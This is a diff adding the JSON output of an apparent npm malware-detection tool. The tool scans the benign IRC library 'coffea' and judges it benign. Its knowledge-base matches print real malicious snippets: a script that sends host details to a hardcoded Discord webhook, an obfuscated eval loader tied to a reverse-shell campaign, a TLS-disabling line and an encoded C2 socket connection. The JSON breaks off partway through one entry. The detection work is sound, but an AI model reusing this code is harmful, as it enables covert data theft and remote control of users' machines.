@@ -1,0 +1,1581 @@
+{
+  "package_name": "coffea",
+  "package_version": "0.4.29",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:07:46.549125",
+  "status": "success",
+  "selected_files_count": 13,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/lib/parser/index.js",
+    "package/lib/event.js",
+    "package/lib/parser/Message.js",
+    "package/lib/parser/Tag.js",
+    "package/lib/parser/parser.js",
+    "package/lib/plugins/005.js",
+    "package/lib/plugins/away.js",
+    "package/lib/plugins/cap-account-notify.js",
+    "package/lib/plugins/cap-away-notify.js",
+    "package/lib/plugins/cap-extended-join.js",
+    "package/lib/plugins/cap-sasl.js"
+  ],
+  "is_malicious": false,
+  "total_files": 13,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "\"use strict\";\n\nvar net = require('net');\nvar tls = require('tls');\nvar fs = require('fs');\nvar StreamReadable = require('stream').Readable;\nvar StreamWritable = require('stream').Writable;\nvar RateLimiter = require('limiter').RateLimiter;\nvar utils = require('./lib/utils');\nvar Parser = require('./lib/parser');\nvar replies = require('irc-replies');\n\nfunction Client(info, throttling) {\n    if (!(this instanceof Client)) { return new Client(info, throttling); }\n\n    try {\n        var pkg = require('./package.json');\n        this.version = pkg.version;\n    } catch (err) { }\n\n    this.streams = {};\n    this.settings = {};\n    this.stinfo = {};\n    this.networked_me = {};\n    this.capabilities = [];\n\n    this._loadPlugins();\n\n    if (typeof info === 'boolean') {\n        throttling = info;\n        info = null;\n    }\n\n    if (throttling !== undefined) {\n        this.throttling = throttling;\n    }\n\n    if (info) {\n        this.add(info);\n    }\n}\n\nutils.inherit(Client, require('eventemitter3'));\n\nClient.prototype._loadPlugins = function() {\n    var _this = this;\n    var files = fs.readdirSync(__dirname + '/lib/plugins/');\n    files.forEach(function (file) {\n        if (file.substr(-3, 3) === '.js') {\n            _this.use(require(__dirname + '/lib/plugins/' + file)());\n        }\n    });\n};\n\nClient.prototype._check = function (network) {\n    var ret = {};\n    var randnick = \"coffea\"+Math.floor(Math.random() * 100000);\n\n    if (typeof network === 'string') {\n        ret.host = network;\n    } else {\n        ret.host = network.host === undefined ? null : network.host;\n    }\n\n    ret.name = network.name;\n\n    ret.nick = network.nick === undefined ? randnick : network.nick;\n    var port = network.ssl === true ? 6697 : 6667;\n    ret.port = parseInt(network.port === undefined ? port : network.port);\n    ret.ssl = network.ssl === undefined ? (ret.port === 6697) : network.ssl;\n    ret.ssl_allow_invalid = network.ssl_allow_invalid === undefined ? false : network.ssl_allow_invalid;\n    ret.username = network.username === undefined ? ret.nick : network.username;\n    ret.realname = network.realname === undefined ? ret.nick : network.realname;\n    ret.pass = network.pass;\n\n    ret.prefix = network.prefix === undefined ? '!' : network.prefix;\n\n    ret.channels = network.channels === undefined ? ret.channels : network.channels;\n\n    ret.throttling = network.throttling;\n\n    ret.sasl = network.sasl === undefined? null : network.sasl;\n    ret.nickserv = network.nickserv === undefined? null : network.nickserv;\n\n    return ret;\n};\n\nClient.prototype._useStream = function (stream, network, throttling, info) {\n    if (network) { stream.coffea_id = network; } else { stream.coffea_id = Object.keys(this.streams).length.toString(); }\n\n    stream.setEncoding('utf8');\n    throttling = ((throttling === undefined) ? this.throttling : throttling);\n\n    stream.limiter = new RateLimiter(1, (typeof throttling === 'number') ? throttling : 250, (throttling === false));\n\n    var parser = new Parser();\n    var _this = this;\n    parser.on('message', function (msg) {\n        _this.onmessage(msg, stream.coffea_id);\n    });\n    parser.on('end', function() {\n        utils.emit(_this, stream.coffea_id, 'disconnect', {});\n    });\n    stream.pipe(parser);\n\n    this.streams[stream.coffea_id] = stream;\n    this.settings[stream.coffea_id] = {};\n    this.stinfo[stream.coffea_id] = info;\n\n    return stream.coffea_id;\n};\n\nClient.prototype.reconnect = function (stream_id) {\n    var info = this.stinfo[stream_id];\n    var stream = info.ssl ? tls.connect({host: info.host, port: info.port}) : net.connect({host: info.host, port: info.port});\n    this._useStream(stream, stream_id, info.throttling, info);\n    this._connect(stream_id, info);\n};\n\nClient.prototype.onmessage = function (msg, network) {\n    msg.command = replies[msg.command] || msg.command;\n    utils.emit(this, network, 'data', msg);\n};\n\nClient.prototype._emitConnect = function (network) {\n    utils.emit(this, network, 'connect', null);\n};\n\nClient.prototype._setupSASL = function (stream_id, info) {\n    this.on('cap_ack', function (err, event) {\n        if (event.capability === 'sasl') {\n            this.sasl.mechanism('PLAIN', stream_id);\n            if (info.sasl && info.sasl.account && info.sasl.password) {\n                this.sasl.login(info.sasl.account, info.sasl.password, stream_id);\n            } else if (info.sasl && info.sasl.password) {\n                this.sasl.login(info.username, info.sasl.password, stream_id);\n            } else {\n                this.sasl.login(null, null, stream_id);\n            }\n        }\n    });\n};\n\nClient.prototype._connect = function (stream_id, info) {\n    this._setupSASL(stream_id, info);\n    if (info.pass) { this.pass(info.pass); }\n    this.capReq(['account-notify', 'away-notify', 'extended-join', 'sasl'], stream_id);\n    this.capEnd(stream_id);\n    this.nick(info.nick, stream_id);\n    this.user(info.username, info.realname, stream_id);\n    if (info.nickserv && info.nickserv.username && info.nickserv.password) {\n        this.identify(info.nickserv.username, info.nickserv.password, stream_id);\n    } else if (info.nickserv && info.nickserv.password) {\n        this.identify(info.nickserv.password, stream_id);\n    }\n    if (info.channels) {\n        this.on('motd', function defaultOnMotd(err, event) {\n            this.join(info.channels, stream_id);\n        });\n    }\n};\n\nClient.prototype.add = function (info) {\n    var stream, stream_id, streams = [];\n    var _this = this;\n    if (info instanceof Array) {\n        info.forEach(function(network) {\n            var stream;\n            network = _this._check(network);\n            if (network.ssl) {\n                stream = tls.connect({\n                    host: network.host,\n                    port: network.port,\n                    rejectUnauthorized: !network.ssl_allow_invalid\n                }, function() {\n                    stream_id = _this._useStream(stream, network.name, network.throttling, network);\n                    utils.emit(_this, stream_id, 'ssl-error', new utils.SSLError(stream.authorizationError));\n                    _this._connect(stream_id, network);\n                    streams.push(stream_id);\n                    _this._emitConnect(stream_id);\n                });\n            } else {\n                stream = net.connect({host: network.host, port: network.port}, function () {\n                    stream_id = _this._useStream(stream, network.name, network.throttling, network);\n                    _this._connect(stream_id, network);\n                    streams.push(stream_id);\n                    _this._emitConnect(stream_id);\n                });\n            }\n        });\n    } else if ((typeof info === 'string') || (info instanceof Object && !(info instanceof StreamReadable) && !(info instanceof StreamWritable))) {\n        info = _this._check(info);\n        if (info.ssl) {\n            stream = tls.connect({\n                host: info.host,\n                port: info.port,\n                rejectUnauthorized: !info.ssl_allow_invalid\n            }, function() {\n                stream_id = _this._useStream(stream, info.name, info.throttling, info);\n                utils.emit(_this, stream_id, 'ssl-error', new utils.SSLError(stream.authorizationError));\n                _this._connect(stream_id, info);\n                _this._emitConnect(stream_id)\n            });\n        } else {\n            stream = net.connect({host: info.host, port: info.port}, function () {\n                stream_id = _this._useStream(stream, info.name, info.throttling, info);\n                _this._connect(stream_id, info);\n                _this._emitConnect(stream_id);\n            });\n        }\n    } else {\n        stream_id = this._useStream(info, null, info.throttling, info);\n    }\n\n    if(streams.length === 0) {\n        return stream_id;\n    } else {\n        return streams;\n    }\n};\n\nClient.prototype.write = function (str, network, fn) {\n    if (typeof(network) === 'function') {\n        fn = network;\n        network = undefined;\n    }\n\n    if (network !== null && typeof network === 'object') {\n        network = network.coffea_id;\n    }\n\n    var _this = this;\n    if (network && this.streams.hasOwnProperty(network)) {\n        _this.streams[network].write(str + '\\r\\n', fn);\n    } else {\n        for (var id in this.streams) {\n            if (this.streams.hasOwnProperty(id)) {\n                this.write(str, id);\n            }\n        }\n        if (fn) {\n            fn();\n        }\n    }\n};\n\nClient.prototype.use = function (fn) {\n    fn(this);\n    return this;\n};",
+          "is_malicious": false,
+          "malice_score": 0.4664694050947826,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code establishes network connections using Node.js net and tls modules to IRC servers specified by user-provided network configurations, including host, port, SSL options, and authentication credentials. It reads configuration data, manages streams with rate limiting, and performs authentication including SASL and NickServ identification using sensitive credentials such as passwords. This enables IRC client connections that may transmit sensitive authentication data over the network, facilitating authenticated communication with IRC servers.",
+          "explanation": "[LLM Judgment: Benign] The provided code implements an IRC client library that manages network connections, including SSL/TLS, authentication (SASL, NickServ), and rate limiting. It uses standard Node.js modules (net, tls, fs) and custom parsers/plugins to facilitate IRC communication. While it handles sensitive data such as passwords for authentication, this is expected behavior for an IRC client and does not indicate malicious intent. There is no evidence of obfuscation, data exfiltration, environment manipulation, or execution of hidden payloads. The code does not match the key malicious indicators from the knowledge base examples, which involve obfuscated payload execution, unauthorized data collection and exfiltration, or disabling security features globally. The use of authentication credentials is legitimate in this context and does not imply malicious behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48609960079193115,
+              "code_similarity": 0.5557035207748413,
+              "behavior_similarity": 0.416495680809021,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205438_695471_snippet_1",
+              "source_package": "angulerjs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205438_695471/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46342411637306213,
+              "code_similarity": 0.42505431175231934,
+              "behavior_similarity": 0.5017939209938049,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// new.js (formatted)\nconst os = require('os');\nconst https = require('https');\nconst { execSync } = require('child_process');\nconst username = os.userInfo().username;\nconst hostname = os.hostname();\nlet ip = '';\ntry {\n  ip = execSync('curl -s ifconfig.me').toString().trim();\n} catch (e) {}\nconst data = JSON.stringify({ username, hostname, ip });\nconst options = {\n  hostname: 'discord.com',\n  path: '/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n};\nconst req = https.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "At preinstall, the code collects the current user's username, hostname, and public IP address using os and child_process modules, then sends this data via HTTPS POST to a hardcoded Discord webhook endpoint, resulting in exfiltration of host information to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The script is executed automatically during the npm package installation process, collects sensitive system and network information, and transmits it to an external Discord webhook without any user notification or consent. This behavior is a clear indicator of malicious intent, as it enables unauthorized data exfiltration at install-time.",
+                  "violated_expectations": "Legitimate npm packages do not collect or transmit host information during installation. Preinstall scripts are expected to perform setup or dependency checks, not to access user details or make outbound network requests to third-party endpoints.",
+                  "similar_legitimate_use": "Some legitimate tools may collect anonymized telemetry or error data, but only with explicit user consent and clear documentation. They do not exfiltrate sensitive host information silently during installation.",
+                  "key_indicators": [
+                    "Use of preinstall script to trigger code execution during installation",
+                    "Collection of username, hostname, and public IP address via os and child_process modules",
+                    "Outbound HTTPS POST request to a hardcoded Discord webhook endpoint",
+                    "No user notification, consent, or documentation of data collection",
+                    "Presence of new.js referenced in package.json preinstall field"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "package.json (preinstall field) and new.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "angulerjs",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.3 (and all versions prior to 8.7.6)",
+                  "why_malicious": "The package is malicious because it surreptitiously collects sensitive host information (username, hostname, and public IP address) during installation and exfiltrates it to attacker-controlled endpoints without user knowledge or consent. It was distributed as part of a large-scale typosquatting campaign, mimicking popular libraries to deceive users and facilitate unauthorized data collection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package (e.g., angulerjs@1.1.3).",
+                    "implemented_by": [],
+                    "leads_to": "Triggers preinstall script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script (new.js) is executed, collecting username, hostname, and public IP address from the host system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is sent via HTTPS POST to a Discord webhook controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive host information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If index.js is executed (manually or by other means), it collects the same information and sends it to hits.dwyl.com.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Provides an alternate exfiltration channel for the attacker."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall scripts that collect and exfiltrate system information (username, hostname, public IP) during installation",
+                    "Outbound network requests to Discord webhooks or suspicious domains (e.g., hits.dwyl.com) from installation scripts",
+                    "Presence of redundant exfiltration logic in both preinstall scripts and main entry points (e.g., new.js and index.js)"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall field referencing suspicious scripts such as new.js",
+                    "new.js or index.js files containing combined use of os, https, and child_process modules for data collection and transmission",
+                    "Hardcoded references to external domains such as discord.com/api/webhooks or hits.dwyl.com in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr",
+                    "Outbound HTTPS POST requests to hits.dwyl.com/api/collect"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that access system information (username, hostname, public IP) and initiate outbound network requests to external domains, especially Discord webhooks or non-standard endpoints like hits.dwyl.com. Flag packages with suspiciously named scripts (e.g., new.js) referenced in package.json preinstall fields. Use static analysis to detect the use of os, https, and child_process modules in installation or entry-point scripts, and employ network monitoring to identify exfiltration attempts to known malicious endpoints. Pay special attention to packages with names mimicking popular libraries, as these are common in typosquatting campaigns."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104221_852989_snippet_2",
+              "source_package": "btc-api-node (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104221_852989/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4530985653400421,
+              "code_similarity": 0.38812369108200073,
+              "behavior_similarity": 0.5180734395980835,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// B64 encoded values in index.js\nconst env = process.env;\nenv['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';",
+                "code_behavior": "At runtime, index.js sets the NODE_TLS_REJECT_UNAUTHORIZED environment variable to '0', globally disabling SSL/TLS certificate verification for all outgoing network requests, allowing untrusted connections.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling SSL/TLS verification exposes all network traffic to interception and man-in-the-middle attacks, and is a known tactic to bypass security controls and facilitate malicious communications.",
+                  "violated_expectations": "Legitimate packages should never globally disable SSL/TLS verification, as this undermines the security of all network communications.",
+                  "similar_legitimate_use": "In rare cases, developers may disable verification for local debugging, but this should never occur in production or in published packages.",
+                  "key_indicators": [
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in process.env",
+                    "Obfuscated (base64-encoded) values in index.js",
+                    "Global impact on all subsequent network requests"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall/runtime",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "btc-api-node",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (removed quickly after upload)",
+                  "why_malicious": "The package impersonates a legitimate cryptocurrency API library but contains a postinstall script that executes a malicious index.js file. This file disables SSL/TLS verification globally, downloads a payload from an attacker-controlled domain, creates hidden directories, and writes compromise markers, enabling further compromise and persistence on the system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js and environment manipulation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js disables SSL/TLS verification for all outgoing network requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Allows unverified and potentially malicious network communication"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js creates a hidden directory and downloads a token file from attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is marked as compromised and ready for stage 2 payloads"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch index.js or similar files during npm package installation",
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in environment variables within package scripts",
+                    "Creation of hidden directories (e.g., .electron) during install process",
+                    "Download of files from non-standard or suspicious domains (e.g., npmaudit.com) during installation"
+                  ],
+                  "file_indicators": [
+                    ".electron/token",
+                    "Presence of index.js with base64-encoded values",
+                    "package.json with postinstall script referencing index.js"
+                  ],
+                  "network_indicators": [
+                    "npmaudit.com (attacker-controlled C2 domain)",
+                    "HTTP(S) requests to https://npmaudit.com/api/v4/init endpoint"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute JavaScript files, especially those that set NODE_TLS_REJECT_UNAUTHORIZED=0 or download files from non-standard domains. Flag packages that create hidden directories or write token files (e.g., .electron/token) during installation. Network monitoring should alert on connections to npmaudit.com or similar suspicious domains and requests to /api/v4/init. YARA rules can be used to detect the base64-encoded string 'Tk9ERV9UTFNfUkVKRUNUX1VOQVVUSE9SSVpFRA==' in process environments or index.js files."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_056835_snippet_4",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45147550106048584,
+              "code_similarity": 0.4546024799346924,
+              "behavior_similarity": 0.4483485221862793,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "const { io } = require(\"socket.io-client\");\n\nconst SERVER_URL = decode(\"==QM1ATN6QTNy4iNyIjLxgTMuUzMx8yL6M3d\");\nconst socket = io(SERVER_URL, {\n  reconnection: true,\n  reconnectionAttempts: Infinity,\n  reconnectionDelay: 1000,\n  reconnectionDelayMax: 5000,\n  timeout: 20000,\n});",
+                "code_behavior": "At runtime, the code decodes an obfuscated server URL and establishes a persistent WebSocket connection to a remote command-and-control (C2) server, enabling real-time exfiltration of collected data and remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscated C2 communication and persistent WebSocket connections from a linter package are strong indicators of malware, enabling covert data exfiltration and attacker control.",
+                  "violated_expectations": "A linter should not communicate with external servers, especially using obfuscated addresses or persistent sockets.",
+                  "similar_legitimate_use": "WebSocket connections may be used in collaborative development tools, but not in static code analysis plugins.",
+                  "key_indicators": [
+                    "Obfuscated or encoded server URL in code",
+                    "Persistent WebSocket connection to external IP",
+                    "Use of socket.io-client in a linter package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (upon package execution, after data collection or persistence setup)",
+                  "file_location": "main package entry point (e.g., index.js)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
